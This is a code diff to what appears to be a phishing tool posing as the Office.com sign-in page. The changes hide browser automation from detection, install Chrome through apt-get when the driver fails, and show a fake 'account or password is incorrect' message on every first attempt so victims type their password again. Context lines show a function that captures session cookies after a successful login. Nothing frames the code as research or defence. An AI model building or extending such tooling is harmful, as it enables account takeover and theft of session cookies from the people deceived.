@@ -163,8 +163,15 @@ def setup_chrome_driver():
         options.add_argument("--disable-dev-shm-usage")
         options.add_argument("--disable-gpu")
         options.add_argument("--window-size=1920,1080")
+        options.add_argument("--disable-extensions")
+        options.add_argument("--disable-plugins")
+        options.add_argument("--disable-images")
+        options.add_argument("--disable-javascript")
+        options.add_experimental_option('useAutomationExtension', False)
+        options.add_experimental_option("excludeSwitches", ["enable-automation"])
         options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36")
         
+        # Try to create driver
         driver = webdriver.Chrome(options=options)
         driver.set_page_load_timeout(30)
         driver.implicitly_wait(10)
@@ -173,7 +180,20 @@ def setup_chrome_driver():
         return driver
     except Exception as e:
         logger.error(f"Failed to initialize Chrome WebDriver: {e}")
-        raise
+        # Try installing Chrome if it fails
+        import subprocess
+        try:
+            subprocess.run(['apt-get', 'update'], check=True, capture_output=True)
+            subprocess.run(['apt-get', 'install', '-y', 'google-chrome-stable'], check=True, capture_output=True)
+            logger.info("Chrome installed successfully")
+            # Retry driver creation
+            driver = webdriver.Chrome(options=options)
+            driver.set_page_load_timeout(30)
+            driver.implicitly_wait(10)
+            return driver
+        except Exception as install_error:
+            logger.error(f"Failed to install Chrome: {install_error}")
+            raise e
 
 def extract_and_save_cookies(driver, email):
     """Extract only session cookies from successful Office.com login and save them"""
@@ -441,7 +461,8 @@ def process_form():
             log_session_activity("first_attempt_blocked", user_email=email, success=False, 
                                error_message="First attempt automatically failed - moving to second pass")
             
-            # Redirect to second pass with try again message  
+            # Always flash error for first attempt and redirect to retry
+            flash('Your account or password is incorrect. Try again.', 'error')
             return redirect(url_for('index', step='retry', email=email, retry='true'))
         
         elif login_attempt.attempt_count == 1:
